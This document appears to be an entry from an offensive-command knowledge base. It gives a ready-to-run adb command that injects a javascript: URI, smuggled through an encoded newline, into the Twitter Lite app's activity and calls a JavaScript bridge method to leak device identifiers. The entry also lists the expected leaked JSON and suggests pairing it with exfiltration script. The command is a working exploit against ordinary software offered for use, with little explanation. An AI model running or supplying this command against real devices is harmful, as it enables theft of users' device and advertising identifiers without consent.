---
data: >-
  adb shell am start -a "android.intent.action.VIEW" -n
  com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d
  "javascript://google.com%0Ajavascript:document.write(apkInterface.getNymizerParams());"
tags:
  - adb
  - js-injection
  - info-leak
type: command
output: >-
  JSON with device info like
  {"aid":"bf49d6c0-1fec-492f-95af-b81dbf680350","dev_brand":"xiaomi"}
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:31.806Z'
id: f7f04e0b-0ae8-4df5-a689-e726580de58c
verified: false
validated: true
submitted: true
---
# adb-invoke-getnymizerparams-in-twitterlite

## Command

```bash
adb shell am start -a "android.intent.action.VIEW" -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://google.com%0Ajavascript:document.write(apkInterface.getNymizerParams());"
```

## Description

Calls getNymizerParams to leak device parameters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -a | VIEW | Yes |
| -n | Component | Yes |
| -d | JS call | Yes |

## Examples

### Basic Usage

As above.

### Advanced Usage

Combine with exfil JS.

## Expected Output

Device JSON output.

## Related

- [[commands/adb-invoke-getapkpushparams-in-twitterlite]]
- [[procedures/Invoke-apkInterface-getNymizerParams-for-Device-Info-Leak-via-JavaScript-Injection]]
